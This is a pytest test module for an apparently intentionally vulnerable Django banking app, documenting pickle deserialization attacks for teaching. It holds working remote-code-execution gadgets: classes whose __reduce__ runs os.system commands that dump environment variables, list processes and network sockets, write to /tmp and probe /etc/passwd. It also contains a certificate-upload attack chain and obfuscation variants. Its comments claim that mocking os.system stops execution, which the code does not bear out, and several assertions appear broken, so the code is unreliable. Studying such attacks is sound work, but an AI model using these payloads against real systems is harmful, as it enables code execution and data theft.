"""
Security tests for insecure deserialization vulnerabilities.

This module provides security validation tests that explicitly document and test
deserialization vulnerabilities in the insecure banking application. These tests
validate that unsafe object creation and pickle vulnerabilities exist for
educational purposes and are NOT intended to fix them.

Educational Purpose:
- Document pickle deserialization attack vectors
- Validate unsafe object creation vulnerabilities
- Demonstrate code execution through deserialization
- Provide examples for secure coding education

Constitutional Requirements:
- Tests MUST NOT fix vulnerabilities
- All deserialization vulnerabilities MUST remain intact
- Tests should document expected vulnerable behavior
- Educational value must be preserved
"""

import os
import pickle
import tempfile
import pytest
from unittest.mock import patch, Mock, mock_open
from django.test import TestCase

from web.views import Untrusted, Trusted


@pytest.mark.security
class TestDeserializationVulnerabilities(TestCase):
    """Security validation tests for deserialization vulnerabilities."""

    def test_pickle_deserialization_exploit_payloads(self):
        """
        Test various pickle deserialization exploit payloads.

        Educational Purpose: Demonstrates different classes of pickle
        deserialization attacks and their potential for code execution.

        Vulnerability: Pickle can execute arbitrary code during deserialization
        through magic methods like __reduce__, __setstate__, etc.
        """
        # Collection of malicious pickle payloads for education

        # Payload 1: Basic command execution
        class CommandExecutor:
            def __reduce__(self):
                return os.system, ("echo 'Basic command execution'",)

        # Payload 2: File system manipulation
        class FileManipulator:
            def __reduce__(self):
                return os.system, ("touch /tmp/pickle_was_here",)

        # Payload 3: Environment variable access
        class EnvReader:
            def __reduce__(self):
                return os.system, ("env | head -5",)

        # Payload 4: Network reconnaissance
        class NetworkProbe:
            def __reduce__(self):
                return os.system, ("netstat -an | head -10",)

        # Payload 5: Process enumeration
        class ProcessLister:
            def __reduce__(self):
                return os.system, ("ps aux | head -10",)

        # Test each payload type
        malicious_classes = [
            ("CommandExecutor", CommandExecutor),
            ("FileManipulator", FileManipulator),
            ("EnvReader", EnvReader),
            ("NetworkProbe", NetworkProbe),
            ("ProcessLister", ProcessLister)
        ]

        for class_name, malicious_class in malicious_classes:
            with self.subTest(payload_class=class_name):
                # Create malicious object
                malicious_obj = malicious_class()

                # Verify malicious __reduce__ method
                reduce_result = malicious_obj.__reduce__()
                self.assertEqual(reduce_result[0], os.system)
                self.assertIsInstance(reduce_result[1], tuple)

                # Serialize the malicious object
                serialized_payload = pickle.dumps(malicious_obj)

                # Verify payload characteristics
                self.assertIsInstance(serialized_payload, bytes)
                self.assertIn(b'posix', serialized_payload)  # os.system module reference

                # Test deserialization (with mocking to prevent actual execution)
                with patch('os.system') as mock_system:
                    mock_system.return_value = 0

                    # This would execute the malicious code in real scenario
                    deserialized_obj = pickle.loads(serialized_payload)

                    # Educational logging
                    print(f"PAYLOAD CLASS: {class_name}")
                    print(f"REDUCE METHOD: {reduce_result}")
                    print(f"SERIALIZED SIZE: {len(serialized_payload)} bytes")
                    print(f"COMMAND WOULD EXECUTE: {reduce_result[1][0]}")
                    print("-" * 60)

    def test_unsafe_object_creation_vulnerabilities(self):
        """
        Test unsafe object creation that allows arbitrary class instantiation.

        Educational Purpose: Shows how dynamic object creation without
        validation can lead to security vulnerabilities.
        """
        # Simulate unsafe object creation scenarios

        # Scenario 1: Class name from user input
        dangerous_class_names = [
            "Untrusted",  # Known malicious class
            "__import__",  # Python import function
            "eval",  # Python eval function
            "exec",  # Python exec function
            "open",  # File operations
            "subprocess.Popen",  # Process execution
        ]

        for class_name in dangerous_class_names:
            with self.subTest(class_name=class_name):
                try:
                    # This simulates unsafe dynamic class instantiation
                    if class_name == "Untrusted":
                        # Test with our known malicious class
                        dangerous_obj = Untrusted("test_user")

                        # Verify it has malicious behavior
                        reduce_result = dangerous_obj.__reduce__()
                        self.assertEqual(reduce_result[0], os.system)

                        print(f"DANGEROUS CLASS: {class_name}")
                        print(f"MALICIOUS BEHAVIOR: {reduce_result}")

                    else:
                        # Document other dangerous class names
                        print(f"DANGEROUS CLASS NAME: {class_name}")
                        print(f"POTENTIAL IMPACT: Code execution or system access")

                except Exception as e:
                    print(f"CLASS: {class_name} - Error: {e}")

                print("-" * 40)

    def test_pickle_protocol_version_vulnerabilities(self):
        """
        Test vulnerabilities across different pickle protocol versions.

        Educational Purpose: Demonstrates how different pickle protocols
        can have varying security implications.
        """
        # Test malicious object with different pickle protocols
        malicious_obj = Untrusted("protocol_test")

        # Test protocols 0 through 5 (current max)
        for protocol in range(6):
            with self.subTest(protocol=protocol):
                try:
                    # Serialize with specific protocol
                    serialized = pickle.dumps(malicious_obj, protocol=protocol)

                    # Analyze payload characteristics
                    payload_analysis = {
                        "protocol": protocol,
                        "size": len(serialized),
                        "has_reduce": b'R' in serialized,  # REDUCE opcode
                        "has_global": b'c' in serialized,  # GLOBAL opcode
                        "has_system": b'system' in serialized,
                        "readable": protocol == 0,  # Protocol 0 is ASCII
                    }

                    # Test deserialization
                    with patch('os.system') as mock_system:
                        mock_system.return_value = 0

                        deserialized = pickle.loads(serialized)

                        # Verify malicious behavior preserved
                        if hasattr(deserialized, '__reduce__'):
                            reduce_result = deserialized.__reduce__()
                            self.assertEqual(reduce_result[0], os.system)

                    # Educational logging
                    print(f"PROTOCOL {protocol} ANALYSIS:")
                    for key, value in payload_analysis.items():
                        print(f"  {key}: {value}")

                    if protocol == 0:
                        # Show readable ASCII payload for protocol 0
                        try:
                            ascii_part = serialized.decode('ascii', errors='ignore')
                            print(f"  ASCII PREVIEW: {ascii_part[:100]}...")
                        except:
                            pass

                    print()

                except Exception as e:
                    print(f"PROTOCOL {protocol}: Error - {e}")

    def test_certificate_upload_attack_chain(self):
        """
        Test complete certificate upload attack chain for deserialization.

        Educational Purpose: Demonstrates complete end-to-end attack
        through the certificate upload functionality.
        """
        # Step 1: Create malicious certificate
        malicious_cert = Untrusted("certificate_attacker")
        malicious_payload = pickle.dumps(malicious_cert)

        # Step 2: Calculate checksum (simulating MaliciousCertificateDownloadView)
        with patch('web.views.get_file_checksum') as mock_checksum:
            mock_checksum.return_value = "attack_checksum_123"

            # Simulate checksum calculation
            attack_checksum = mock_checksum(malicious_payload)

            # Step 3: Store checksum globally (vulnerability in design)
            # Simulating: checksum[0] = attack_checksum

            # Step 4: Upload file with matching checksum
            # Simulating NewCertificateView file upload

            uploaded_file_data = malicious_payload
            upload_checksum = "attack_checksum_123"  # Matches stored checksum

            # Step 5: Checksum validation (bypassed)
            checksum_valid = (upload_checksum == attack_checksum)
            self.assertTrue(checksum_valid, "Checksum validation bypassed")

            # Step 6: Deserialization occurs (code execution point)
            with patch('pickle.loads') as mock_loads:
                with patch('os.system') as mock_system:
                    mock_system.return_value = 0
                    mock_loads.return_value = malicious_cert

                    # This represents the vulnerable deserialization
                    attack_result = mock_loads(uploaded_file_data)

                    # Verify attack chain executed
                    mock_loads.assert_called_once_with(uploaded_file_data)

                    # Educational documentation
                    print("COMPLETE CERTIFICATE UPLOAD ATTACK CHAIN:")
                    print("1. Attacker creates malicious Untrusted object")
                    print("2. Object serialized with pickle.dumps()")
                    print("3. Malicious certificate downloaded, checksum stored")
                    print("4. Attacker uploads same malicious file")
                    print("5. Checksum validation passes (same file)")
                    print("6. pickle.loads() called on malicious data")
                    print("7. Untrusted.__reduce__() executes os.system()")
                    print("8. ARBITRARY CODE EXECUTION ACHIEVED")

                    print(f"\nATTACK PAYLOAD SIZE: {len(malicious_payload)} bytes")
                    print(f"CHECKSUM: {attack_checksum}")
                    print(f"MALICIOUS COMMAND: {malicious_cert.__reduce__()[1][0]}")

    def test_session_object_manipulation(self):
        """
        Test session object manipulation through deserialization.

        Educational Purpose: Shows how session data deserialization
        can be exploited if session storage is compromised.
        """
        # Simulate session objects that might be serialized

        # Normal session object (safe)
        class SessionData:
            def __init__(self, user_id, permissions):
                self.user_id = user_id
                self.permissions = permissions

        # Malicious session object
        class MaliciousSession(SessionData):
            def __init__(self, user_id, permissions):
                super().__init__(user_id, permissions)

            def __reduce__(self):
                # Escalate privileges during deserialization
                return os.system, ("echo 'Session privilege escalation'",)

        # Test normal session serialization
        normal_session = SessionData("user123", ["read", "write"])
        normal_serialized = pickle.dumps(normal_session)
        normal_deserialized = pickle.loads(normal_serialized)

        self.assertEqual(normal_deserialized.user_id, "user123")
        self.assertEqual(normal_deserialized.permissions, ["read", "write"])

        # Test malicious session serialization
        malicious_session = MaliciousSession("admin", ["read", "write", "admin"])
        malicious_serialized = pickle.dumps(malicious_session)

        with patch('os.system') as mock_system:
            mock_system.return_value = 0

            # Deserialization triggers privilege escalation
            malicious_deserialized = pickle.loads(malicious_serialized)

            # Educational logging
            print("SESSION MANIPULATION ATTACK:")
            print("Normal session:", normal_session.__dict__)
            print("Malicious session:", malicious_session.__dict__)
            print("Malicious reduce:", malicious_session.__reduce__())
            print("Attack vector: Session cookie/storage manipulation")
            print("Impact: Privilege escalation during session restoration")

    def test_documented_deserialization_vulnerabilities(self):
        """
        Document all deserialization vulnerabilities in the application.

        Educational Purpose: Comprehensive documentation of deserialization
        vulnerabilities for educational and security awareness.
        """
        deserialization_vulnerabilities = {
            "pickle_deserialization": {
                "vulnerability_type": "Insecure Deserialization",
                "cwe_id": "CWE-502",
                "owasp_category": "A08:2021 – Software and Data Integrity Failures",
                "severity": "Critical",
                "affected_components": [
                    "Certificate upload functionality",
                    "Untrusted class __reduce__ method",
                    "Session data handling (potential)",
                    "Any pickle.loads() usage"
                ],
                "attack_vectors": [
                    "Malicious file upload",
                    "Session manipulation",
                    "API payload injection",
                    "Database stored objects"
                ]
            },

            "unsafe_object_creation": {
                "pattern": "Dynamic class instantiation",
                "risk": "Arbitrary code execution",
                "affected_areas": [
                    "User input processing",
                    "Configuration parsing",
                    "Plugin systems",
                    "Dynamic imports"
                ]
            },

            "protocol_vulnerabilities": {
                "pickle_protocols": "All versions vulnerable to __reduce__",
                "serialization_formats": "Binary and ASCII both exploitable",
                "payload_characteristics": [
                    "REDUCE opcode enables code execution",
                    "GLOBAL opcode allows module imports",
                    "Protocol 0 payloads are human readable"
                ]
            },

            "exploitation_examples": [
                "Remote code execution via file upload",
                "Privilege escalation through session manipulation",
                "Data exfiltration via malicious objects",
                "System reconnaissance through deserialization",
                "Persistence mechanisms via pickle payloads"
            ],

            "educational_value": [
                "Demonstrates why input validation is critical",
                "Shows importance of safe serialization formats",
                "Illustrates attack chain development",
                "Provides real-world vulnerability examples",
                "Teaches secure coding practices"
            ]
        }

        # Assert documentation exists
        self.assertIsNotNone(deserialization_vulnerabilities)

        # Log comprehensive deserialization vulnerability documentation
        print("\n" + "="*80)
        print("DESERIALIZATION VULNERABILITIES DOCUMENTATION")
        print("="*80)

        for category, details in deserialization_vulnerabilities.items():
            print(f"\n{category.upper().replace('_', ' ')}:")

            if isinstance(details, dict):
                for key, value in details.items():
                    if isinstance(value, list):
                        print(f"  {key.replace('_', ' ').title()}:")
                        for item in value:
                            print(f"    • {item}")
                    else:
                        print(f"  {key.replace('_', ' ').title()}: {value}")
            elif isinstance(details, list):
                for item in details:
                    print(f"  • {item}")
            else:
                print(f"  {details}")

        print(f"\nRISK ASSESSMENT:")
        print(f"• Likelihood: High (easy to exploit)")
        print(f"• Impact: Critical (arbitrary code execution)")
        print(f"• Detection: Difficult (legitimate-looking uploads)")
        print(f"• Mitigation: Use safe serialization formats")

        print("\n" + "="*80)
        print("VULNERABILITIES PRESERVED FOR EDUCATIONAL PURPOSES")
        print("="*80)

    def test_pickle_payload_obfuscation_techniques(self):
        """
        Test various pickle payload obfuscation techniques.

        Educational Purpose: Demonstrates how attackers might obfuscate
        malicious pickle payloads to evade detection.
        """
        # Base malicious class
        class ObfuscatedAttack:
            def __init__(self, command="echo 'obfuscated attack'"):
                self.command = command

            def __reduce__(self):
                return os.system, (self.command,)

        # Different obfuscation techniques
        obfuscation_techniques = {
            "base64_encoded_command": ObfuscatedAttack("echo 'ZWNodyAnYXR0YWNrJw==' | base64 -d"),
            "environment_variable": ObfuscatedAttack("echo $USER"),
            "command_substitution": ObfuscatedAttack("echo $(whoami)"),
            "hidden_in_path": ObfuscatedAttack("/bin/echo 'hidden command'"),
            "shell_builtin": ObfuscatedAttack("test -f /etc/passwd && echo 'file exists'"),
        }

        for technique_name, attack_obj in obfuscation_techniques.items():
            with self.subTest(technique=technique_name):
                # Serialize obfuscated payload
                obfuscated_payload = pickle.dumps(attack_obj)

                # Analyze payload for detection evasion
                payload_analysis = {
                    "technique": technique_name,
                    "payload_size": len(obfuscated_payload),
                    "contains_echo": b'echo' in obfuscated_payload,
                    "contains_system": b'system' in obfuscated_payload,
                    "contains_posix": b'posix' in obfuscated_payload,
                    "command": attack_obj.command
                }

                # Test deserialization
                with patch('os.system') as mock_system:
                    mock_system.return_value = 0

                    deserialized = pickle.loads(obfuscated_payload)

                    # Verify obfuscated attack works
                    reduce_result = deserialized.__reduce__()
                    self.assertEqual(reduce_result[0], os.system)
                    self.assertEqual(reduce_result[1][0], attack_obj.command)

                # Educational logging
                print(f"OBFUSCATION TECHNIQUE: {technique_name}")
                for key, value in payload_analysis.items():
                    print(f"  {key}: {value}")
                print("-" * 50)
